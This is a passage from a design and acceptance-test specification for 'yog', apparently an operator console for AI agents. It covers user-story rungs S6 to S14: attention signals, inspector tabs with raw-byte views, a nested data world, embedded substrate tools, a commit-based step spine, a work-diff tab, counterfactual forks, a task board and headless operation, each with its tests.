  A clears the signal in B after the adopt, and B's focus and scroll are
  unmoved (§13.1's line, tested from both sides).
- **S6-T3 failure-stirs-then-settles** (`stories_s6_t3.rs`): a fixture whose latest step failed →
  the conversation stirs the strip through rule 2; after the ack the strip is
  quiet while the state badge and the Login affordance still render.
- **S6-T4 rollups-and-jump** (`stories_s6_t4.rs`): the workspace rollup is the
  **count** of its attention-bearing agents (§6's "max over its agents" is
  that count's `> 0`), strip totals sum those counts across workspaces, and
  jump-to-next walks the derived order, wrapping across workspaces. It never
  sticks *because it acknowledges what it lands on* — so the walk drains the
  strip rather than cycling a fixed list, and with the strip empty there is no
  next signal to stick past.
- **S6-T5 activity-chip** (`stories_s6_t5.rs`): an ops fixture with k failures
  → the chip label carries `activity · N ops · k failed ⚠` in ichor (the §11
  glyph doctrine gave the chip room to say the outcome outright, and it takes
  both word and glyph from `theme::op_badge`, so the chip can never spell an
  outcome differently from the rows it summarizes); the ⚠ axis is quieted by
  the operator's ack (bl-c417) while `N` is not, because the chip may never
  claim fewer ops than the pane below it lists; an expanded row yields argv/cwd/exit/stderr
  verbatim, and a line clipped by the §4.2 cap renders its `truncated` marker
  rather than silently short bytes. (INV-2 is the mechanized half: *every*
  dispatch error has a row.)

## S7 — Forensic: every byte inspectable

Machine state: a conversation that did something surprising.

1. The center is transcript-first. Only a conversation **with children** grows
   the compact descent tree — one selectable row per member, and selecting one
   is the same acknowledgement gesture as anywhere else (§6).
2. **Six** tabs answer six questions: what was said (Transcript), what ran
   (Steps), what is waiting (Inbox), what was written (Files), what policy
   governed it (Config — "policy frozen at `<short-oid>`", derived from git
   ancestry, not from a stored pointer), and what an attempt actually changed
   (Work). This rung said "five" until the attempt surface landed; Work is the
   one tab a history notch does not pin.
3. Steps drill into meta / request / response / staging and per-tool input and
   output through one collapsible JSON widget, and **every tab that parses a
   file carries a Raw toggle** showing that file's verbatim bytes: Transcript
   (the `messages/` entry), Steps (the selected step's record), Inbox (the
   deposit, envelope and all). Nothing is summarized away; a file yog cannot
   parse renders as an error row rather than vanishing.

   **Two tabs carry no toggle, and that is the rule rather than an exception
   to it** (bl-1ff1, which found the promise written as "every tab" while only
   Transcript had one). Raw is the escape from a *parse* — it exists because a
   projection is not its source. **Files** has no projection to escape: its
   per-file preview *is* the file's bytes (bounded at 64 KiB, with a hit cap
   said outright and a binary declared opaque rather than mangled), so a toggle
   there would swap the bytes for the bytes. **Config** parses no file at all:
   it names the commit policy is frozen at and lists that commit's tree, so
   there is no file whose bytes it stands in front of. The cost of that
   honesty, stated plainly: the frozen commit's *contents* are unreachable from
   that tab — the §9.3 editor reads branch tips, not the ancestor an agent
   forked off. Reading a file **as of a commit** is the history rung's job
   (VISION V1: "selecting a notch pins the whole inspector to that commit"),
   which is one mechanism for every tab, not a per-frame `git show` per listed
   path bolted behind a checkbox — the per-frame git read this repo already
   removed once (bl-ee0a).
4. Budget is a fold over the subtree's usage events. Limits render as the raw
   `workflow.yaml` text, because yog owns no YAML parser and will not become a
   second authority on one.
5. Pending mail explains `✉n`, and Flush is `lernie scan`. A committed
   `tool_use` with no `tool_result` renders "tool in progress" — a fact read
   off the transcript, not a guess about a running process.

Burden check: six tabs behind one selection; the S0 stranger lands on
Transcript and never leaves it. The digit keys 1–6 are those same six tabs —
one concept, two ways in.

Tests:
- **S7-T1 tabs-dispatch** (`stories_s7_t1.rs`): one fixture per tab; each builds from disk alone,
  and on every tab that carries the toggle — Transcript, Steps, Inbox — Raw
  yields the underlying file's bytes unaltered, asserted against the bytes read
  back off the fixture disk so a re-serialization cannot pass (a jsonview tree
  and a stripped deposit envelope both fail that assertion, which is the point).
- **S7-T2 step-drilldown** (`stories_s7_t2.rs`): a step carrying request/response/staging and a
  tool call → the jsonview row tree matches the parsed value; a malformed step
  file renders an error row and the sibling tabs still build.
- **S7-T3 budget-fold** (`stories_s7_t3.rs`): usage across a root and two children folds to the
  subtree total shown in the header; the limit line is raw text, never parsed.
- **S7-T4 inbox-and-progress** (`stories_s7_t4.rs`): deposits parse from/deposited_at/epitaph,
  `✉n` equals the count, Flush dispatches `lernie scan <ws>`; a committed
  tool_use with no result renders "tool in progress".
- **S7-T5 descent-only-with-children** (`stories_s7_t5.rs`): a single-agent conversation has no
  descent however wide the fold is opened; adding a child gives its list row one
  row per member at its own depth, and selecting a member retargets the
  inspector.

## S8 — Neighbour: yog beside your own shell

Machine state: an operator who also drives `bl` and `lernie` by hand.

1. **yog's substrate state is yog's.** One nested world under
   `$XDG_DATA_HOME/yog` (§16.2) holds the nested lernie home, the nested balls
   state and yog's own two artifacts. `rm -rf` that directory and the world is
   gone, with the ambient lernie, balls and brazen untouched — severability
   you can actually run.
2. **The overlap is chosen, not accidental.** An agent pointed at a project's
   board claims into the shared store branch, so that ball shows up in the
   operator's own `bl list` and vice versa — but it is pointed there
   deliberately (§16.3, point 4), never by default. Brazen shares *nothing*:
   since the blast-radius ruling its config, credentials and model
   cache live inside the focused workspace's wall (§16.2), so the operator's
   own `bz` state is neither read nor written by yog, and a sign-in made in one
   sphere is invisible to every other.
3. `eval "$(yog env)"` drops a shell *into* the world; `yog exec <cmd…>` runs
   one command there. That is how a project is primed into the world in v1 —
   and the empty balls section renders exactly that command rather than
   growing a button (§8.3).
4. Each agent tracks its tasks on a balls **space of its own** — its own clone
   bundle and its own balls config home, under its workspace's wall (§16.3).
   `/marks <branch>` reads or amends the branch that space rides; `balls/tasks`
   is the project's shared board, which is where an agent raised to work an
   existing project is pointed from birth. There is no yog config file — the
   value is balls' own `tasks_branch` key in balls' own config, so removing the
   space deletes config, not code.
5. Two yogs side by side render the same data, acknowledgements included (I0);
   only focus, scroll and unsent drafts stay per-instance.

Burden check: an operator who never opens a shell meets none of this. The
world is *composed* at startup, which is pure; it is *materialized* only by
the same first Start that S0 already describes (I7).

Tests:
- **S8-T1 world-compose** (`stories_s8_t1.rs`): the composed env overrides
  exactly `LERNIE_HOME`, `XDG_STATE_HOME` **and `PATH`** — the third is §16.7
  W9's prepend of `<world>/tools`, so an agent's bare `bl` is the world's own
  shim (§16.4); this row said "exactly two" until that landed, and the third
  belongs to the same set for the same reason (a pure function of the anchor,
  idempotent under re-composition). It leaves the **anchor** `XDG_DATA_HOME`
  ambient and names no workspace at all — since the blast-radius
  ruling brazen's config, credentials and model cache are the *workspace's*
  (DESIGN §16.2's wall), so the world env answers no brazen paths and an
  ambient `BRAZEN_CONFIG` buys nothing. Re-deriving the anchor through the
  world env is a fixed point (no bootstrap special case).
- **S8-T2 every-spawn-nested** (`stories_s8_t2.rs`): every dispatched verb —
  the start steps, the per-agent verbs, the `bl` verbs — carries the world
  overrides, asserted through the world `Cli` so a new call site inherits them
  by construction; the dir yog watches and the dir a spawned `bl` writes are
  one path. One `Cli` is spent across several unrelated verbs and **every**
  recorded spawn is checked, which is what makes the structural claim
  observable: a verb that built its own `Cli` shows up here as a bare child.
  (`Cli::with_env` was widened to `pub` for exactly this — the `tests/` crate
  cannot mutate process env to arrange it any other way.)
- **S8-T3 hatches**: `yog env` prints exactly the export lines the world
  composes, and `yog exec <cmd…>` runs its argv under them with the requested
  cwd — both pure entrypoints of the yog binary, neither a substrate spawn.
- **S8-T4 task-branch knob** (`stories_s8_t4.rs`): two workspaces resolve two
  space roots under their own walls; a launch pointed at a project layers no
  `YOG_MARKS` (so that agent's `bl` is the board's own) while every other rung
  is given its own; the amendment writes `tasks_branch` into balls' own layer-2
  config inside one space and leaves the other reading balls' default; and the
  world's own space keeps §16.2's state exactly where it is while nesting
  balls' config home. **No yog-owned file is written** — the only thing yog
  puts on disk beside that one balls key is its §4.2 ops trail, which holds no
  policy. (The row used to assert `bl conf set task-remote none` / `origin`;
  the per-agent ruling retired the modes, and `bl conf set
  task-branch` cannot serve a per-agent binding at all — it is scope-keyed to
  the landing, which belongs to a clone. bl-e47b.)

## S9 — Settler: the only thing you installed is yog

**This rung escalates downward.** Every rung above adds skill; this one
subtracts a prerequisite, and its acceptance is that S0's entry bar
disappears. It **landed** with phase 2 (§16.7): all three substrates are linked
crates and every wave, W8–W14, is in.

Machine state: a machine with yog and nothing else — no `lernie`, no `bl`, no
`bz` on `PATH`.

1. Launch yog and S0 runs **exactly as written**. Nothing is probed for
   absence because nothing is shelled to for the substrate work yog owns:
   balls, brazen and lernie are exact-pinned crates and the pin *is* the
   version (§16.5).
2. The toolchain pane loses its remediation column — and with it, its reason to
   exist. There is no install command to show, so the phase-1 capability gate
   was deleted with the phase it belonged to (§16.7 W13, landed): S0-T4 and
   S5-T1/T2 are **removed, not skipped**, and what is left of the pane is the
   §8.3 Login surface it always also carried (§16.4).
3. Agents working on yog's world get `<yog-data-root>/world/tools/bl` — yog
   re-execing itself against the embedded balls crate and the nested roots,
   first on the world's `PATH` — so an agent's `bl claim` computes the world's
   paths and shares yog's own implementation. (Named plainly `bl` and found by
   bash, *not* lernie's `lernie-tool-<name>` JSON-stdin tool slot: the §16.4 W9
   amendment.)
4. **Identity stops being an instruction.** The shim stamps `--as $YOG_NAME`
   on any verb the caller left unstamped, and §3.3's phase-1 preamble sentence
   is deleted with it: the agent cannot forget what it never had to remember.
5. The driver is yog re-execed (W11), and nothing about the concurrency model
   moves: drivers are still flock-holding processes, plugin dispatch is still
   a subprocess.

Burden check (inverted): the intro's phase-1 premise is retired. S0's bar
falls from "yog + current substrate binaries" to "yog"; no rung above gains a
gesture, and every story test above must pass unchanged against the embedded
substrates — that equality is this rung's real assertion.

**Amended 2026-07-26 by the W14 clean room, which is this rung's own drive: the
premise is retired for S0/S1 and NOT for the ball rung.** With only `yog` and
`git` on `PATH` all eight S0/S1 beats pass to a live wire and every substrate
process is the driven yog itself (the standing done-bar above,
the 2026-07-26 W14 clean-room drive). But there was **no gesture that
enters a project** in that room: `yog exec` never seeded the world's shims
(bl-44a5) and the embedded `bl` refused `prime` by the §16.4 W9 ruling, whose
remediation — "run a host bl by path" — is exactly this rung's deleted premise
(bl-2930).

**Re-amended 2026-07-26: the room can prime — the ball rung's premise is
retired too.** bl-44a5 made the hatches converge `world/tools/` before handing
the world out, and bl-2930 closed the plugin-binary seam (upstream U-balls-3:
`delivery_bin::run`/`tracker::run`; yog: the `bl-delivery`/`bl-tracker`
multiplex arms + shims, the `bl` arm naming `world/tools/bl` as balls'
executable) and deleted the refusal. S3-T5's rendered `yog exec bl prime` is
now a paved path *with* pavement: it founds a checkout whose plugin chain
re-enters yog, with only yog and git on `PATH` (§16.4; the in-repo proof is
`tests/multiplex_bl.rs`, the room's is `cleanroom.sh … run-s3s4s6`).

Tests:
- **S9-T1 no-host-binaries**: the story suite runs with `lernie`/`bl`/`bz`
  absent from `PATH` → S0-T1 and S1-T1 pass unchanged; the gate tests are gone
  from the suite rather than ignored (**done** — W13 removed them, W14 drove
  the real-substrate half for S0/S1 in the clean room, and bl-44a5/bl-2930
  unblocked S3's rung: `tests/multiplex_bl.rs` walks prime→claim→close on the
  embedded balls with the `*_BINARY` fallthroughs scrubbed).
- **S9-T2 tool-shim-argv**: `world/tools/bl <verb> …` honors bl's argv
  contract and resolves the **nested** clone and worktree roots, never the
  ambient ones — the §16.4 correctness argument, asserted as paths.
- **S9-T3 identity-injected**: an unstamped verb through the shim gains
  `--as $YOG_NAME`; a verb that carries its own `--as` is passed through
  untouched; the composed preamble no longer contains the stamp instruction.
- **S9-T4 pin-is-the-version**: no surface anywhere renders a tool verdict or a
  remediation affordance, because there is nothing to verdict — version skew is
  unrepresentable, not merely unlikely. W13 discharged this by *deletion* rather
  than by a pane that reads the lockfile back: printing pins yog already links
  would be a fact with no decision hanging on it (§14's no-second-authority
  rule).

## S10 — Historian: the step spine is a commit spine

Machine state: a conversation with history worth walking. Graduated from
VISION V1 (bl-98da); the rung's authority for what it must do is that section.

1. The chat grows a **step spine**: one notch per step, each notch that
   step's read-state commit — the branch tip the model call was assembled
   against, already recorded in `meta.json` and already read by the Steps view
   (§5.1 #29/#30). Each notch **is** a horizontal rule across the transcript,
   at the row where that call's reading began; the newest is at the bottom
   where the transcript's tail already sits (re-seated by bl-1802 — the ruling
   and its reasoning are VISION V1's "Re-seated by bl-1802" note).
2. Selecting a notch **pins the whole inspector** to that commit: transcript as
   of, agent-context files as of, config frozen at, budget folded to that point
   (§5.1 #31). One commit, four reads, **no new mechanism per tab** — which is
   the shape S7 point 3 named when it declined a per-tab checkbox, and it is why
   the frozen commit's contents are reachable at last. The Raw toggle keeps
   showing verbatim bytes of the pinned tree. Project files are not in that tree;
   naming a project commit a notch can join is bl-2b8c's, not this rung's.
3. **The release reaches every pinnable tab**, because the pin does: an
   operator who pins and then opens Files must still be able to let go. The
   rules live in the Transcript tab, so the **pin banner** — which already
   paints above every pinnable tab and already names the commit — carries the
   release, which is one existing gesture given a second seat and no new verb.
   **One gesture, both directions** — clicking the pinned rule releases it too
   — and a step whose call recorded no commit draws no rule, because there is
   no tree behind it to pin.
4. **An agent's graph edges are two distinct facts, never conflated.** The
   *context* edge — what the child inherited — is git ancestry, from the notch
   its branch forks off. The *provenance* edge — who dispatched it — is the
   descent id plus the dispatch notch, which is the rule its card hangs under.
   A clean child (`lernie dispatch --from config/<name>`) has provenance only.
   Since bl-1802 the difference on screen is the card's **fork label** in words
   (`from here` / `from <Name>@<oid>` vs `from config/<name>`), not a solid and
   a dashed stroke: a rule across a chat has no gutter to stroke in, and the
   label was already saying it. §11's descent tree stays the descent-**id**
   tree either way; drawing the descent as a graph is bl-5cf8.
5. A dispatch notch carries a **live child card**: name, fork-point label
   (`from here` / `from config/<name>` / `from <Name>@<oid>`), state chip, the
   child's own `steps/<id>` spend, and a **streaming tail** — the last line or
   two of its in-flight inference text, off the same fold the bottom in-flight
   strip reads. Moving text means active; still text means tool-wait or
   quiescent. Following a card is the ordinary selection gesture.
6. Everything is a **pure read of the lernie workspace repo** — refs, trees,
   commits — derived, never pushed. **No new verb anywhere**, in yog or
   upstream. Both edges cost no git call at all: an agent's `steps` list is
   `git log --first-parent … --not --branches=config/*`, so the longest common
   prefix of parent and child *is* the fork point and its emptiness *is*
   cleanness. The one new disk read is the pinned Files tree, memoized per
   snapshot with the commit in its key — never per frame (the read this repo
   already removed once, bl-ee0a).
7. **V2.3's fan anchor is this seat**: a sibling group renders anchored at its
   birth notch — one card grown to N columns — so when V2 lands the fan is
   point 5's card grown wide, not a new seat.

Burden check: no dispatches → no cards; the rules the chat carries are the ones
bl-929d already drew, so an operator who never clicks one sees today's
transcript exactly. It needs no gate — the `navigable` check that kept a gutter
from claiming width went with the gutter.

Tests:
- **S10-T1 rail-spine**: one notch per step carrying that step's `meta.json`
  commit, in step order; a step that recorded none is still a notch and says so
  (`—`); and with nothing dispatched the chat carries its rules and no cards —
  the burden check, run rather than asserted in prose.
- **S10-T2 two-edges**: a fork sharing its parent's commit prefix wears both
  edges and reads `from here` when the two coincide; a fork from an older notch
  splits them and names `from <Name>@<oid>`; a clean child sharing no commit
  wears provenance only and names its config branch. The label is the whole
  rendering of the distinction since bl-1802, so there is no stroke to assert.
- **S10-T3 notch-pin**: a pinned notch names its commit, folds the budget
  through it and carries the cut its chat seat decided; the transcript cuts at
  what that call read (two drains with no call between them are ONE notch, not
  two); and three ways a pin declines — nothing selected, an index the spine no
  longer has, a notch with no commit — all resolve to today's read.
- **S10-T3b spine-place** (bl-1802): the pairing, run against the case that
  broke the old one — a turn calling two tools is three steps behind one
  delivered run, and each step's rule lands on the entries **it** read, so the
  next delivered run carries the commit of the call that read it and not of a
  call three messages earlier. Plus: the running call marks the tail of the
  chat, a superseded call that sealed nothing takes no seat, and a step the
  transcript has not caught up with takes none either.
- **S10-T4 spine-paint**: every rule paints its read-state commit in short-oid
  form above its crossing and never the full id; a step with no commit paints no
  rule; clicking a rule pins and clicking it again releases; a card paints its
  child, fork point, state chip, own spend and streaming tail under the rule it
  was born at; clicking a card asks to open that child.
- **S10-T5 pinned-tree**: against a real fixture repo, the Files listing as of a
  commit is that commit's blobs with their sizes as of then, `messages/`
  excluded exactly as the live walk excludes it; one file's bytes come back
  through the same `Text`/`Binary`/`Truncated` vocabulary the live preview uses;
  a commit git does not have lists nothing.
- **S10-T6 pinned-inspector**: a pin states the commit and the budget as of it
  above every pinnable tab, and no pin says nothing at all; and **clicking the
  banner releases the pin** from any of them — the proof that an operator who
  pinned in the chat and then opened Files is not stranded.

## S11 — Auditor: what the agent actually changed

Machine state: a workspace holding a claimed ball whose work branch carries
commits. Graduated from VISION §4.10 (bl-2b8c's project-delivery contract) by
bl-3746; that section is the rung's authority for *what* is compared.

1. The inspector grows a **Work tab**. For every ball the focused
   conversation's workspace holds, it shows the exact comparison the ruling
   names — `target..source` — and nothing it had to invent to get there. The
   **source** is the claim's own branch, `work/<id>`, spelled by balls'
   `delivery_path::work_branch`. The **target** is balls' own delivery-target
   rule re-derived from the balls the snapshot already carries: the parent
   ball's work branch when this ball close-gates a live parent, else the
   project's integration branch (`git symbolic-ref --short HEAD`, balls'
   spelling). yog and `bl close` therefore cannot name two different targets.
2. The listing is **one row per changed file** with lines added and removed,
   off `git diff --numstat` — counts, not bytes, so opening the tab never
   pays for the patch. A binary file says *binary*; a zero would be a lie
   about a file that changed. The exact range and both commits are printed,
   and the hover carries the literal `git -C <project> diff <target>..<source>`
   — the exact raw access stays one shell away.
3. Picking a file **reads its patch below**, bounded exactly as a file preview
   is and classified by the same `Text`/`Truncated`/`Binary` vocabulary the
   Files tab uses (one fold, `files_view::classify`, now shared by the live
   walk, the pinned tree and this). The pick names a ball as well as a path,
   because a workspace holding two balls has two diffs and a bare path would
   not say which.
4. **Nothing unreadable is swallowed.** A project repo that is gone, is not a
   git repository, or names no branch reads as *unreadable*; a ref that does
   not resolve is *absent*, naming which end is missing; a resolved pair with
   nothing between them says the branch carries no edits. Three sentences, and
   none of them is a blank list — VISION §4.10 item 4's mandate that a missing
   project renders as a named absence, never a guess.
5. **The rail's pin does not reach this tab, and the banner does not claim
   it.** A pin is a commit of the *conversation's* repo; the project commit
   each step read is the per-step OID of §4.10 item 4, which nothing writes
   yet. Saying so is cheaper than a tab that quietly shows today's project
   under a banner that says "as of".
6. It is a **pure read** — of a project repo this time, through the same
   env-scrubbed `git` doorway — with **no new verb anywhere**, in yog or
   upstream, and no write of any kind. Nothing is stored, indexed, or cached
   across snapshots: both reads are memoized per published snapshot, never per
   frame, exactly as the pinned Files tree is.
7. It has a **headless spelling**, because everything does (VISION §4.8):
   `/work-diff` is the listing and `/work-diff <ball> <path>` is one file's
   patch, the same `Query::WorkDiff` the tab builds, answered by the same
   function and encoded as the same rows.

Burden check: a workspace that holds no ball says so in one line and reads
nothing; an operator who never opens the tab pays nothing at all, because an
inactive tab builds no view-model. This rung feeds VISION V3's comparison
(bl-c2bd) and implements none of it: there is no candidate, no cohort, no
selection here — one attempt, read.

Tests:
- **S11-T1 attempt-plan**: the claimant equality picks exactly the balls that
  name this workspace; a flat ball leaves its target to the repo while a
  close-gated child targets its parent, and bare containment or a dead parent
  does not; two projects give two attempts in path order; numstat rows read as
  churn with binary said as itself and an unreadable row contributing nothing.
- **S11-T2 project-read**: against a real project repo, the diff is
  `target..source` of the bound claim with both commits named; a close-gated
  child reads against its parent's branch and not the integration branch; an
  unworked branch diffs to nothing; an unminted ref is named absent; a
  non-repo and a repo whose objects are damaged are both unreadable; a picked
  file's patch comes back through the preview vocabulary; a workspace with no
  claim has no attempt.
- **S11-T3 work-paint**: the tab paints the range, both short commits, each
  file's churn and the truncation marker; clicking a row picks ball and path
  together; the patch paints through all three preview classes; and each of the
  four declines is a sentence on screen.
- **S11-T4 headless work-diff**: the query answers off the tab's own
  derivation; the wire keeps *unreadable*, *absent* and *diff* distinguishable
  and carries the patch's class; the line round-trips in both moods and a
  half-named file is refused rather than guessed at.

## S12 — Counterfactualist: try it again from here

Machine state: a conversation with history worth walking, and a step the
operator wishes had gone differently. Graduated from VISION V2 (bl-dc0c); the
rung's authority for what it must do is that section, as amended by the three
implementation rulings recorded there.

1. A pinned notch (S10) offers **Fork from here**: a goal composer seeded
   empty, beside the pin banner, which dies with the pin. That is V2's burden
   check made structural — the composer is reachable from a pinned notch and
   from nowhere else — and a workspace whose config declares no role anywhere
   paints no composer at all, because a button that cannot work is not offered.
2. Its **three fire-time controls are three parameters of one real argv**
   (`lernie dispatch <role> <ws> <parent> --goal <text> --from <ref> [--pin …]`,
   shipped in lernie 0.0.6 and in the pin): the **fork point** (`here` — this
   conversation as of the mark — or a `config/<name>` head for a clean start:
   one control, two kinds of value), the **role**, and the **skills**. Nothing
   yog invents rides along.
3. **The role is the model, and that is what keeps it honest.** lernie binds a
   provider and a model id to a role in the `providers.yaml` of the config
   commit governing the fork point, and nowhere else — so the composer lists
   that ref's roles with the model each names, read from the file the run will
   resolve against (§5.1 #33). A free model dropdown here could offer a model
   no config declares; giving an attempt one is a config write (§9.4), not a
   dispatch flag.
4. **×N repeats the gesture; it is not a gesture of its own.** The boundary
   grew one attempt-shaped `Fork` and Fire crosses it once per candidate, each
   with its own overrides. So one attempt and a parallel cohort are the same
   path in the strongest available sense — the same single gesture, counted —
   and the trail carries one `ops.jsonl` row per candidate rather than one for
   all of them.
5. **The cohort is derived and nothing records it** (§5.1 #32): it is V1's
   cards grouped by the notch they were born at — the anchor S10 point 7
   reserved. No fan registry, no fan verb, no winner field. The group states
   the ancestry its members share once and gives each candidate a column with
   its state chip, its terminal response and its own spend; candidates off
   different refs share nothing to hoist, so each column says its own. **A
   cohort of one wears no header and is exactly the card S10 drew.**
6. **The terminal response is not a new read.** `streaming_text` is the latest
   step's accumulated text, re-read every tick — the live tail while a
   candidate runs, and the last thing it said once it settles. A second reader
   of that one open file would disagree with this one at every moment it
   matters.
7. **Read-only by construction.** An attempt forks the conversation repo and
   nothing else. Project-mutating attempts need §4.10's isolation and binding
   (bl-8746) and are not reachable from this rung — nothing here can touch a
   project worktree.

Burden check: no pin, no composer; no fork, no cohort. Never pin a notch and
the inspector is exactly S10's, which is exactly today's.

Tests:
- **S12-T1 attempt-argv**: one attempt is the ordinary dispatch with a ref —
  role, workspace, parent, the goal **verbatim** (spacing and newlines
  included), `--from`; a clean start differs from a fork in that one argument
  and nothing else; each skill is one `--pin` whose destination mirrors the
  pool's own layout, so a pinned skill lands where `load_skill` would have put
  it.
- **S12-T2 fire-time-policy**: against a real fixture repo, the points are
  `here` plus every config branch; each carries the roles its **governing**
  config commit declares with the model each binds (worker on sonnet,
  compactor on haiku, straight out of the file); and two ways a ref declares
  nothing — no config lineage reaches it, or the lineage carries no
  `providers.yaml` — both leave the point showing and offering nothing, which
  is a fact about the workspace rather than a silence.
- **S12-T3 cohort-one-path**: ×N grows by cloning the last candidate and
  floors at one; skills toggle per candidate and a stale index edits nothing;
  readiness is one rule both seats refuse on; candidates born at one notch are
  one cohort stating their shared ancestry once, a lone child is that same
  grouping with one member, and candidates off different refs have no common
  ancestry to state.
- **S12-T4 fan-paint**: a cohort paints `×N`, the shared ancestry once, and
  every candidate's name, state chip, terminal response and spend side by
  side; a cohort of one paints exactly the card S10 drew; a mixed cohort says
  so and its columns speak for themselves.
- **S12-T5 three-spellings**: the attempt round-trips through the envelope and
  through the line, with and without skills; the line's goal is the whole tail
  after `--goal`, flags it mentions included (which is why the flags lead);
  every parameter it cannot invent refuses by name; a `skills` field of the
  wrong shape refuses rather than being half-obeyed, while an absent one is no
  skills.
- **S12-T6 skills-pool**: the pool is the world's own `$LERNIE_HOME/skills`, a
  directory counts only when it carries the instructions, and an absent pool
  is no skills rather than an error.
## S13 — Admiral: the balls section is the board (VISION V4)

Machine state: a project with a decomposed backlog; some balls claimed, some
waiting on a gate.

1. **The balls section renders four columns** — ready / gated / claimed /
   blocked — each headed by its own derived count, a column with no rows
   rendering nothing at all. The three familiar rungs are derived *exactly* as
   `bl list` derives them, through the one ladder the §3.5 join reads:
   claimant ⇒ claimed, else an unresolved **claim**-blocker ⇒ blocked, else
   ready.
2. **Gated is the fourth column and it is not a new status.** It is balls' own
   `closeable` predicate — a **close**-blocker, which balls' own doc says
   "never shows as a status, it only gates the finish". A gated row is one you
   could claim and could not deliver, and it names the ball whose close mints
   its gate. A claimed ball that is also gated stays in *claimed* — a drone
   holds it — with the gate rendered on the row, so nothing hides in a bucket.
3. **A drone's exit-with-handoff is a column, not a dead conversation** (V4.4).
   Committed, unclaimed, still gated: the ball reappears on the board at its
   gate, by the same derivation, with no special case anywhere.
4. **A claimed row names its drones, and they are conversation rows** — the
   §3.3 goal stamps resolved to their roots, which is *the same set* §3.5
   attributes spend by. One derivation answers "who is on this" and "whose
   spend is this"; the row carries the root id the conversation list already
   keys on, so the operator sees the object they already know.
5. **Spend is a column**, and an epic carries the rollup over its live subtree
   across every workspace its children are claimed in — §3.5's recorded
   follow-on, enumerated off the board's own join. Each workspace contributes
   once: whole, if any member there attributes workspace-wide, else the union
   of its stamped roots.
6. **The board never costs a frame a disk read.** The `steps/` walk moved to
   the derivation worker and rides out on the snapshot; a figure per row is a
   filter over memory. This is also the fix for the pre-existing frame-thread
   walk the Altitude-1 header made.
7. **It is a query with three spellings**, not a widget: `/board`,
   `{"op":"board"}`, and the window's own variant, all one `boundary::answer`.
   Every action a row offers was already a boundary variant, so the board adds
   no gesture — and there is no GUI-only surface.

**What this rung deferred, and where it landed:** V4.2's armed-loop facts —
cap, count, tick, spawn/reap rows with comparison-shaped reasons. There was no
armed loop when this rung shipped: bl-3381 had shipped the *watcher* clock
(`cadence.yaml`) and nothing else, and V4's own precondition held fleet mode
shut until a drone had a mechanical isolated project target (bl-2b8c) **and**
its tools had an explicit capability policy (bl-0cea). Both closed, and the
loop landed as its own rung, **S18** (bl-66fb) — and it landed *off*.
V4's burden check still rules everything an unarmed operator sees, verbatim:
*"unarmed, the board is today's balls section"*.

Burden check: an operator with one ready ball sees one column with one row —
today's section, grouped. A world with no balls renders no columns at all, and
the S0 stranger's window is unchanged.

Tests:
- **S13-T1 columns-are-the-ladder-crossed**: the `board::column` table
  exhaustively — every (ladder rung × gated?) cell, including claimed-and-gated
  staying claimed — plus the assertion that all three ladder columns spell
  themselves with balls' own `Status::word`, so the board and `bl list` cannot
  drift in vocabulary.
- **S13-T2 one-fixture-per-column**: four balls whose *stored* facts put them
  in the four columns; each lands where its blockers and claimant say, each
  column's derived count is 1, and a gated row names the gating ball's id and
  title.
- **S13-T3 the-live-set-is-the-resolver**: a close-blocker onto a ball that has
  since closed is no gate at all, and the row is plain ready — the same rule
  the claim ladder resolves by, spelled once.
- **S13-T4 board-is-the-join-filtered**: delivered, unassigned-workspace and
  orphaned-project join rows leave the board rather than arriving with a
  fabricated status; order is priority then id, deterministic (I9).
- **S13-T5 drones-and-spend-are-one-derivation**: a claimed row's drone rows
  are the stamped roots, named with the §3.3 display name, and the row's figure
  is the figure those same roots attribute; an unclaimed ball carries no figure
  at all rather than a zero.
- **S13-T6 rollup-crosses-workspaces-billing-each-once**: an epic whose
  children are claimed in two workspaces sums all three conversations; a leaf
  gets no rollup; a subtree bound nowhere gets none either; and one unstamped
  member widens its whole workspace to the workspace arm, **absorbing** the
  stamped sibling beside it rather than adding to it.
- **S13-T7 three-spellings**: `Query::Board` round-trips through the codec and
  through `line::spell`/`parse`, the help table carries its page, and the reply
  encodes every optional field present-or-absent in both directions.
- **S13-T8 the-walk-is-the-workers**: a bill carries its conv id, selection
  after the walk equals the scoped walk itself, and a repeated root does not
  double-bill.

## S14 — Teleoperator: yog without the window (VISION V5)

Machine state: the operator is not at the machine — a phone, a peer fleet's
coordinator, an agent. Some conversations are waiting on somebody.

1. **`yog headless` is the same binary minus the window, and now literally the
   same code.** One `Engine::boot` (`src/engine.rs`) is the whole of a running
   yog minus its face: the §5.2 startup sweep, the §7.1 roots, the model's first
   synchronous derivation, and the derivation worker + watch bridge + gesture
   consumer beside it. The two faces are two calls to it differing in one
   argument — the repaint hook. This is a *deletion*, not a feature: the
   assembly used to exist twice inside `main.rs`, the one file coverage
   excludes, so the copies could drift and no test could see it. What a window
   adds beside the engine is exactly what a window is — an event loop to wake,
   the §8.5 searcher, and the §5.3 RAM surfaces a pointer needs.
2. **The attention strip is addressable.** `/attention` is the §6 predicate as a
   list: every conversation waiting on the operator across every workspace, in
   §6's attention-ranked roster order — the jump's order, which the ↓ key
   walked until bl-fa82 gave that key §11's visible list rows — each row
   carrying the address a gesture
   takes (`workspace` + `agent`), its name, its state, **which** signals fire,
   what it last said, its age, and its undelivered-mail count. It is not a
   second model of "what needs you" — the queue is the roster's own subsequence,
   so its length is the strip's own number.
3. **Answering writes the window's watermarks.** `/seen` records the
   conversation's present evidence as acknowledged, from the *one* definition
   (`attention::evidence`) the window's focus tick reads — so a headless answer
   and a windowed one are the same bytes in `ui.json`, and I0 converges the two
   frontends over one disk rather than over a protocol. Its answer is **the
   queue that remains**, which makes the operator's loop one gesture per
   decision. Undelivered mail is not a watermark and is not quieted: §6 rule 5
   self-clears when a driver reads the inbox, and no acknowledgement may pretend
   otherwise.
4. **Forwarding needed no verb.** An escalation handed on is `/message` aimed at
   somebody else, carrying the row's own text. A `/forward` would be a second
   spelling of a gesture that exists.
5. **The reclassification is written down, not smuggled.** §4.8 files seen
   watermarks under *views*, and that stands where it was written: at the
   window the watermark rides on focus, and focusing is looking. A seat with no
   focus has no looking to ride on, so acknowledging there is the operator
   saying "handled" — it changes what every other seat is told needs attention,
   which is doing something. Hence an action, and hence DESIGN §8.5 says so out
   loud.

**What this rung deferred, and where it landed:** V5.1's "backend loop". The
clock was real (`cadence.yaml`) and the dispatch surface was real; the fleet
loop did not exist anywhere in `src/` — bl-9dd4 established that — and VISION
§8's no-capability-theater refusal plus §4.3's hold on fleet mode (then pending
bl-0cea) both forbade growing one under a teleoperation rung. It landed on its
